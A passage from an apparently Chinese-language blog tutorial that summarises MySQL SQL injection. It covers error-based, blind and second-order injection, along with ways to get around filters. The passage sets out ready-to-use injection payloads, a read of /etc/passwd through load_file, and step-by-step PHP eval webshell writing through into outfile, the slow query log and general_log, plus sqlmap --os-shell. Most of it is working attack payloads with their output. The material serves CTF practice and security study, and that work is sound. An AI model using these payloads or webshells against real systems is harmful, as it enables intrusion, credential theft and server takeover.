src="/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/QQ20250110-194236.png"></p><p>所以我们可通过该方法查到任意想要的字段值，payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select a,b from posts where a=-1 union select 1,(select concat(`3`,0x2d,`4`) from (select 1,2,3,4,5,6 union select * from xxx)a limit 1,1);</span><br></pre></td></tr></table></figure></li><li><h4 id="join、using"><a href="#join、using" class="headerlink" title="join、using"></a>join、using</h4><p>join用于合并两个表，using表示使用什么字段进行连接，用using指定了连接字段则查询结果只返回连接字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from (select * from test a join test b)c;</span><br></pre></td></tr></table></figure><p>原理是用 join 连接两张表时, <strong>遇到重复的列名会报错, 并把这个报错的列名显示出来</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from (select * from test a join test b)c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;a&#x27;</span><br><span class="line">mysql&gt; select * from (select * from test a join test b using(a))c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;b&#x27;</span><br></pre></td></tr></table></figure><p>通过 using 可以<strong>声明连接时的关联条件</strong>, 类似于平常写 inner join 时候的 <strong><code>on a.id = b.id</code></strong>, 这样就可以<strong>避免该字段重复而报错</strong></p><p>这里设置别名的时候省略了 <code>as</code>, 完整的写法如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from (select * from users as a join users as b) as c</span><br></pre></td></tr></table></figure><p><img src="/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/QQ20250110-203658.png"></p><p>而join在连接不同表时不需要用别名，因为两张表本身就不一样，但是我们把test自身连接就需要设置别名以对两张表进行区分，否则会报错</p><p>这里有三种利用，union第一种：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from emails where id=1 union select * from (select * from users a join users b)c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;id&#x27;</span><br><span class="line">mysql&gt; select * from emails where id=1 union select * from (select * from users a join users b using(id))c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;username&#x27;</span><br></pre></td></tr></table></figure><p>union第二种，需要知道字段数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from emails where id=1 union select 1,(select * from (select * from users a join users b)c);</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;id&#x27;</span><br><span class="line">mysql&gt; select * from emails where id=1 union select 1,(select * from (select * from users a join users b using(id))c);</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;username&#x27;</span><br></pre></td></tr></table></figure><p>直接用 and 连接, 不使用 union</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from emails where id=1 and (select * from (select * from users a join users b)c);</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;id&#x27;</span><br><span class="line">mysql&gt; select * from emails where id=1 and (select * from (select * from users a join users b using(id))c);</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;username&#x27;</span><br></pre></td></tr></table></figure></li><li><h4 id="order-by盲注"><a href="#order-by盲注" class="headerlink" title="order by盲注"></a>order by盲注</h4><p>order by对结果进行排序：0-9 a-z，不区分大小写</p><p>本质上是利用 order by 按字母顺序排序的特点, 如果我们<strong>输入的数据前几位符合 password 的内容, 会优先显示我们的数据</strong>, 如果输入的数据不符合的话, 就会显示原本的数据 (也可以加上 asc desc 改一下显示顺序)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from test where a=&#x27;111&#x27; union select 1,&#x27;111111&#x27; order by 2;</span><br><span class="line"></span><br><span class="line">select * from test where a=&#x27;111&#x27; union select 1,&#x27;1111112&#x27; order by 2;</span><br></pre></td></tr></table></figure><p><img src="/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/QQ20250110-203316.png"></p></li><li><h4 id="ascii比较盲注"><a href="#ascii比较盲注" class="headerlink" title="ascii比较盲注"></a>ascii比较盲注</h4><p>利用 mysql 比较字符时会转换成 ascii 的特性来进行盲注</p><p>原理就是利用字符串单个字符依次比较：</p><p><img src="/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/QQ20250110-205013.png"></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from test where a=&#x27;111&#x27; and (select &#x27;111&#x27;,&#x27;1&#x27;)&gt;(select * from test limit 0,1);</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from test where a=&#x27;111&#x27; and (select &#x27;111&#x27;,&#x27;111&#x27;)&gt;(select * from test limit 0,1);</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from test where a=&#x27;111&#x27; and (select &#x27;111&#x27;,&#x27;111111&#x27;)&gt;(select * from test limit 0,1);</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from test where a=&#x27;111&#x27; and (select &#x27;111&#x27;,&#x27;1111111&#x27;)&gt;(select * from test limit 0,1);</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from test where a=&#x27;111&#x27; and (select &#x27;111&#x27;,&#x27;11111111&#x27;)&gt;(select * from test limit 0,1);</span><br><span class="line">+-----+---------+</span><br><span class="line">| a   | b       |</span><br><span class="line">+-----+---------+</span><br><span class="line">| 111 | 1111111 |</span><br><span class="line">+-----+---------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p><img src="/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/QQ20250110-205612.png"></p><p>也可以比较字符串，但该方法有个缺点，就是列名是<code>id username password</code>，如果想猜出password的内容，就要把id和username猜出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(select 1,2,3)&gt;(select * from users limit 0,1); # 第一个位置先猜 id</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">(select 1,&#x27;Dumb&#x27;,3)&gt;(select * from users limit 0,1); # 第二个位置再猜 username</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">(select 1,&#x27;Dumb&#x27;,&#x27;Dumb&#x27;)&gt;(select * from users limit 0,1); # 第三个位置才能猜 password</span><br></pre></td></tr></table></figure></li></ul><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>利用条件：知道数据库中的列名且后端使用了<code>magic_quotes_gpc</code>等转移函数对引号过滤</p><p>原理就是在我们进行SQL注入时，后端仅仅使用了addslashes()或者magic_quotes_gpc()等转义函数对字符进行了转义，但存入数据库时存入的数据依然是原来的数据，且数据库对存入数据十分信任，下次取出时毫无保留的取出从而引发安全问题。</p><p>比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;SELECT * FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span><br></pre></td></tr></table></figure><p>这时我们传入数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&#x27;#</span><br></pre></td></tr></table></figure><p>虽然会被转义，但传入数据库后数据就为<code>admin&#39;#</code>，当下次我们登录时<code>admin&#39;#</code>就会直接取出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;SELECT * FROM users WHERE username=&#x27;admin&#x27;#&#x27; and password=&#x27;$password&#x27;&quot;;</span><br></pre></td></tr></table></figure><p>从而实现二次注入</p><h2 id="mysql-getshell"><a href="#mysql-getshell" class="headerlink" title="mysql getshell"></a>mysql getshell</h2><h3 id="获取网站根目录"><a href="#获取网站根目录" class="headerlink" title="获取网站根目录"></a>获取网站根目录</h3><ul><li>phpinfo()：直接显示web路径</li><li>web报错信息：可以通过各种fuzz尝试让目标报错，也有可能爆出绝对路径（单引号、参数报错）</li><li>一些集成的web框架：如果目标站点是利用phpstudy、LAMPP等之类搭建的，可以猜测默认路径或者通过查看数据库保存的路径、配置文件等</li><li>搜索引擎、利用其他漏洞、中间件错误解析等</li></ul><h3 id="into-outfile写shell"><a href="#into-outfile写shell" class="headerlink" title="into outfile写shell"></a>into outfile写shell</h3><p>利用条件：</p><ul><li><p><strong>secure_file_priv为空</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#x27;%secure%&#x27;</span><br></pre></td></tr></table></figure><blockquote><p><strong>secure_file_priv &#x3D; 任意路径读写</strong><br><strong>secure_file_priv &#x3D; path 只能在该指定路径下读写</strong><br><strong>secure_file_priv &#x3D; null 不能读写</strong></p></blockquote></li><li><p><strong>具有写入文件权限</strong></p></li><li><p><strong>知道网站绝对路径</strong></p></li></ul><p><code>into outfile</code>与<code>into dumpfile</code>用法一样，都能够写文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php @eval($_POST[CMD]); ?&gt;&#x27; into outfile &#x27;\/var\/www\/html\/shell.php&#x27;;</span><br></pre></td></tr></table></figure><p>load_file()函数读取文件:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-2 union select 1, 2, 3, load_file(&#x27;//etc//passwd&#x27;), 5</span><br></pre></td></tr></table></figure><h3 id="慢日志写shell"><a href="#慢日志写shell" class="headerlink" title="慢日志写shell"></a>慢日志写shell</h3><p>慢日志：一般都是通过long_query_time选项来设置时间值，时间以秒为单位，可以精确到微秒。如果查询时间超过了这个时间值（默认为10秒），这个查询语句将被记录到慢查询日志中。</p><p>前提：</p><ul><li><strong>root权限</strong></li><li><strong>网站的绝对路径且具有写入权限</strong></li></ul><p>查看服务器默认时间值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#x27;%long_query_time%&#x27;</span><br><span class="line">show global variables like &#x27;%long%&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/QQ20250419-164739.png"></p><p>查看慢日志参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#x27;%slow%&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/QQ20250419-165029.png"></p><p>慢日志参数修改getshell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set global slow_query_log=1  #打开慢日志</span><br><span class="line">set global slow_query_log_file=&#x27;D:\\phpStudy\\WWW\\shell.php&#x27;  #设置慢日志路径，注意：一定要用双反斜杠</span><br><span class="line">select &#x27;&lt;?php @eval($_POST[a]);?&gt;&#x27; or sleep(11)  #这儿11是超过慢日志的10秒时间</span><br></pre></td></tr></table></figure><p><img src="/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/QQ20250419-165553.png"></p><h3 id="general-log全局日志写shell"><a href="#general-log全局日志写shell" class="headerlink" title="general_log全局日志写shell"></a>general_log全局日志写shell</h3><p><strong>利用前提</strong>：</p><ul><li><p><strong>root权限</strong></p></li><li><p><strong>网站的绝对路径且具有写入权限</strong></p></li></ul><p><strong>相关参数</strong>：</p><ul><li><p><code>general_log</code>：控制是否启用通用查询日志（记录所有客户端执行的SQL语句）。</p></li><li><p><code>log_output</code>：指定通用查询日志的输出方式，支持两种模式</p><ul><li><code>FILE</code>：日志写入文件（默认值）。</li><li><code>TABLE</code>：日志存入<code>mysql.general_log</code>系统表。</li><li><code>FILE,TABLE</code>：同时输出到文件和数据表。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SET GLOBAL log_output = &#x27;FILE&#x27;;   -- 仅文件</span><br><span class="line">SET GLOBAL log_output = &#x27;TABLE&#x27;;  -- 仅表</span><br><span class="line">SET GLOBAL log_output = &#x27;FILE,TABLE&#x27;; -- 同时输出</span><br></pre></td></tr></table></figure></li><li><p><code>general_log_file</code>：定义通用查询日志文件的存储路径（仅当<code>log_output</code>包含<code>FILE</code>时生效）。</p></li></ul><p><strong>原理</strong>：开启<strong>general_log</strong>后，系统将mysql执行的每一条查询语句写入我们<strong>指定位置的文件</strong>里。而文件的位置则由<strong>general_log_file</strong>确定。我们可以开启这个选项后，执行<code>SELECT &#39;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;&#39;;</code>，这个指令就把木马插入到我们指定的php文件中去了。</p><p><strong>利用</strong>：</p><p>开启日志功能：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;general_log&#x27;;   # 查看日志是否开启</span><br><span class="line">set global general_log=on;   # 开启日志功能</span><br></pre></td></tr></table></figure><p>设置日志输出类型：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;log_output&#x27;;</span><br><span class="line">set global log_output=&#x27;file&#x27;;</span><br></pre></td></tr></table></figure><p>设置日志保存位置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;general_log_file&#x27;;</span><br><span class="line">set global general_log_file=&#x27;D:/phpStudy/WWW/shell.php&#x27;;</span><br></pre></td></tr></table></figure><p>写shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php @eval($_POST[&#x27;a&#x27;]);?&gt;&#x27;;</span><br></pre></td></tr></table></figure><h3 id="sqlmap-–os-shell写shell"><a href="#sqlmap-–os-shell写shell" class="headerlink" title="sqlmap –os-shell写shell"></a>sqlmap –os-shell写shell</h3><p>原理就是利用sqlmap通过into outfile向服务器写入两个文件，一个可以直接执行命令，一个进行文件上传。</p><p>条件：</p><ul><li><strong>要求为数据库DBA，使用<code>--is-dba</code>查看当前网站连接的数据库账号是否为mysql user表中的管理员如root，是则为dba</strong></li><li><strong>secure_file_priv没有具体值</strong></li><li><strong>知道网站的绝对路径</strong></li></ul><p>利用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1 --os-shell</span><br></pre></td></tr></table></figure><h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><h3 id="information-schema过滤绕过"><a href="#information-schema过滤绕过" class="headerlink" title="information_schema过滤绕过"></a>information_schema过滤绕过</h3><p>在注入时，infromation_schema库的作用是获取<code>table_schema、table_name、column_name</code>这些数据库内的信息。</p><p>而一些题会将<strong>or过滤</strong>使我们查表时无法使用<code>information_schema</code>，而往往这种题型都需要将<code>information_schema</code>替换并配合无列名注入来得到flag</p><h4 id="InnoDB-引擎表"><a href="#InnoDB-引擎表" class="headerlink" title="InnoDB 引擎表"></a>InnoDB 引擎表</h4><ul><li><p><strong>mysql.innodb_table_stats: 存储 InnoDB 表的统计信息。</strong></p></li><li><p><strong>mysql.innodb_index_stats: 存储 InnoDB 索引的统计信息。</strong><br><strong>这两个表会记录表和索引的信息，日志会定期更新。</strong></p></li><li><p><strong>MySQL 5.6 及以上版本</strong></p><p>可以使用<code>mysql.innodb_table_stats</code>和<code>mysql.innodb_table_index</code>这两张表来替换information_schema.tables实现注入，但是<strong>缺点是没有列名</strong>，所以常配合无列名注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,2,(select group_concat(database_name) from mysql.innodb_table_stats)%23</span><br><span class="line"></span><br><span class="line">?id=0&#x27; union select 1,2,(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())%23</span><br></pre></td></tr></table></figure></li></ul><h4 id="sys库"><a href="#sys库" class="headerlink" title="sys库"></a>sys库</h4><p>在<strong>MySQL 5.7中，新增了sys系统数据库</strong>，通过这个库可以快速地了解系统的元数据信息。sys库是通过视图的形式把information_schema和performance_schema结合起来，查询出更加令人容易理解的数据。</p><p>sys库下有两种表：</p><ul><li><strong>字母开头： 适合人阅读，显示是格式化的数；</strong></li><li><strong><code>x$</code>开头 ： 适合工具采集数据，原始类数据；</strong></li></ul><p>下面是sys库中可以代替<code>infromation_schema</code>注入作用的视图：</p><ul><li><p><strong><code>sys.schema_auto_increment_columns</code></strong> 对表自增ID的监控，用于保存那些有自增字段的表的数据库相关信息。缺点是依然无法查询指定数据库某表的列</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 查询数据库</span><br><span class="line">select table_schema from sys.schema_auto_increment_columns;</span><br><span class="line"># 查询指定数据库的表</span><br><span class="line">select table_name from sys.schema_auto_increment_columns where table_schema=&#x27;security&#x27;;</span><br></pre></td></tr></table></figure></li><li><p><strong><code>schema_table_statistics_with_buffer和x$schema_table_statistics_with_buffer</code></strong></p><p>前面的<code>schema_auto_increment_columns</code>对应的是存在自增列的表，但是针对不存在自增列的表的话可以通过这两个视图来实现查询。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 查询数据库</span><br><span class="line">select table_schema from sys.schema_table_statistics_with_buffer;</span><br><span class="line">select table_schema from sys.x$schema_table_statistics_with_buffer;</span><br><span class="line"># 查询指定数据库的表</span><br><span class="line">select table_name from sys.schema_table_statistics_with_buffer where table_schema=&#x27;challenges&#x27;;</span><br><span class="line">select table_name from sys.x$schema_table_statistics_with_buffer where table_schema=&#x27;challenges&#x27;;</span><br></pre></td></tr></table></figure></li></ul><h3 id="比较符号-、过滤绕过"><a href="#比较符号-、过滤绕过" class="headerlink" title="比较符号=、&lt;、&gt;过滤绕过"></a>比较符号<code>=</code>、<code>&lt;</code>、<code>&gt;</code>过滤绕过</h3><h4 id="in"><a href="#in" class="headerlink" title="in()"></a>in()</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr(select database(),1,1)) in(115);</span><br><span class="line">//根据回显判断</span><br></pre></td></tr></table></figure><h4 id="like"><a href="#like" class="headerlink" title="like"></a>like</h4><p>可利用like模糊查询代替<code>=</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr(select database(),1,1)) like &#x27;s%&#x27;;</span><br></pre></td></tr></table></figure><h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select database() regexp &#x27;^s&#x27;; </span><br><span class="line">//根据回显判断</span><br></pre></td></tr></table></figure><h4 id="greatest-least"><a href="#greatest-least" class="headerlink" title="greatest()&#x2F;least()"></a>greatest()&#x2F;least()</h4><p><strong>greatest (n1, n2, n3…)</strong>: 返回 n 中的最大值</p><p><strong>least (n1,n2,n3…)</strong>: 返回 n 中的最小值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id = 1 and greatest(ascii(substr(username,1,1)),1)=116</span><br><span class="line">#这里的 greatest(查询，1）是用与比较取出其中最大的值用于爆破</span><br><span class="line">#如果任何给定值为NULL，则返回NULL。否则，它将返回最大值。</span><br></pre></td></tr></table></figure><h4 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp()"></a>strcmp()</h4><p>**strcmp(str1,str2)**：比较两个字符串，如果这两个字符串相等返回0，如果第一个参数是根据当前的排序小于第二个参数顺序返回-1，否则返回1。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select*from users where id=1 and strcmp(asci(substr(username,1,1)),117)</span><br></pre></td></tr></table></figure><h3 id="绕过空格过滤"><a href="#绕过空格过滤" class="headerlink" title="绕过空格过滤"></a>绕过空格过滤</h3><h4 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h4><p>%09(制表符), %0a(换行), %0b(垂直制表符), %0d(回车), %a0(不间断空格)都能代替空格</p><h4 id="注释符代替"><a href="#注释符代替" class="headerlink" title="注释符代替"></a>注释符代替</h4><p>注释替换空格：<code>/**/</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1/**/and/**/1=1</span><br></pre></td></tr></table></figure><h4 id="括号嵌套"><a href="#括号嵌套" class="headerlink" title="括号嵌套"></a>括号嵌套</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select(group_concat(table_name))from(information_schema.tables)where(tabel_schema=database());</span><br></pre></td></tr></table></figure><h4 id="反引号"><a href="#反引号" class="headerlink" title="反引号"></a>反引号</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union(select`table_name`,`table_type`from`information_schema`.`tables`);</span><br></pre></td></tr></table></figure><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>适用于对于大小写不敏感：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">And</span><br></pre></td></tr></table></figure><h3 id="Or-and-xor-not绕过"><a href="#Or-and-xor-not绕过" class="headerlink" title="Or and xor not绕过"></a>Or and xor not绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">And == &amp;&amp;</span><br><span class="line">Or == ||</span><br><span class="line">Xor = |</span><br><span class="line">Not = !</span><br></pre></td></tr></table></figure><p>也可采用异或注入进行盲注：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 union select (substr(database(),1,1)=&#x27;s&#x27;) ^ 0 --</span><br></pre></td></tr></table></figure><p>or被过滤可采用无列名注入</p><h3 id="注释符绕过"><a href="#注释符绕过" class="headerlink" title="注释符绕过"></a>注释符绕过</h3><p>mysql中的注释符：</p><ul><li>单行注释：<code>--+</code>、<code>-- </code>、<code>#</code></li><li>多行注释：<code>/*多行注释内容*/</code></li></ul><p>注释符常起到闭合单引号、多单引号、双引号等功能</p><h3 id="等价函数绕过"><a href="#等价函数绕过" class="headerlink" title="等价函数绕过"></a>等价函数绕过</h3><ul><li><p><strong>if（）&#x3D;&gt; case…when..then…else…end</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0&#x27; or if((ascii(substr((select database()),1,1))&gt;97),1,0)#</span><br><span class="line">=</span><br><span class="line">0&#x27; or case when ascii(substr((select database()),1,1))&gt;97 then 1 else 0 end#</span><br></pre></td></tr></table></figure></li><li><p><strong>hex()、bin()&#x3D;&#x3D;&gt;ascii()</strong></p></li><li><p><strong>sleep()等价</strong>：</p><p><strong>benchmark():</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sleep(5)  //5秒</span><br><span class="line">benchmark(10000000,sha(1))  //2.79秒</span><br></pre></td></tr></table></figure><p><strong>笛卡尔积</strong>：</p><p>笛卡尔积是指两个集合中所有可能的行组合，通过利用笛卡尔积计算大量数据从而导致时间延迟的效果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(1=1, (SELECT COUNT(*) FROM tableA, tableB, tableC), 0) --</span><br></pre></td></tr></table></figure><p><strong>GET_LOCK:</strong></p><p><code>GET_LOCK(str, timeout)</code>是MySQL的锁管理函数,通过竞争锁机制间接实现时间差判断</p><p>其中：</p><p><strong>str</strong>：锁名称（字符串，唯一标识）。</p><p><strong>timeout</strong>：尝试获取锁的最大等待时间（秒）。</p><p>利用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; AND IF(ASCII(SUBSTR((SELECT username FROM users LIMIT 1),1,1))=65, GET_LOCK(&#x27;injection_lock&#x27;,5), 0) --</span><br></pre></td></tr></table></figure><blockquote><p>攻击者首次注入时，尝试获取锁<code>injection_lock</code>，设置超时时间为5秒。</p></blockquote><p>当条件为真时当前会话会尝试获取锁，若锁已被占用则会阻塞5秒。</p><p>所以要达到延迟的效果我们需要一开始获取锁，使其被占用从而延迟：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and get_lock(&#x27;injection_lock&#x27;,1)--</span><br></pre></td></tr></table></figure><p><strong>RLIKE:</strong></p><p>**RPAD(str, len, padstr)**：用于将字符串填充到指定长度。</p><p><strong>repeat</strong>：重复一个字符串指定次数。</p><p><strong>RLIKE</strong>：用于正则表达式匹配</p><p>原理就是<code>rpad</code>或<code>repeat</code>构造长字符串，加以计算量大的pattern，通过repeat的参数可以控制延时长短。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpad(&#x27;a&#x27;,4999999,&#x27;a&#x27;) RLIKE concat(repeat(&#x27;(a.*)+&#x27;,30),&#x27;b&#x27;);</span><br></pre></td></tr></table></figure><blockquote><p><code>.*</code>贪婪匹配，会尽可能匹配更多字符。</p></blockquote><p><code>repeat(&#39;(a.\*)+&#39;, 30)</code>生成正则表达式片段 <code>(a.\*)+</code>重复30次后再追加字符b，形成完整正则表达式，当匹配时会尝试匹配所有字符找b从而达到时间延迟</p></li><li><p><strong>concat_ws()&#x3D;&#x3D;&gt;group_concat()</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(database());</span><br><span class="line">=</span><br><span class="line">select concat_ws(1,database());</span><br></pre></td></tr></table></figure></li><li><p>mid()、substr()&#x3D;&#x3D;&gt;substring() </p></li><li><p>@@user&#x3D;&#x3D;&gt;user() 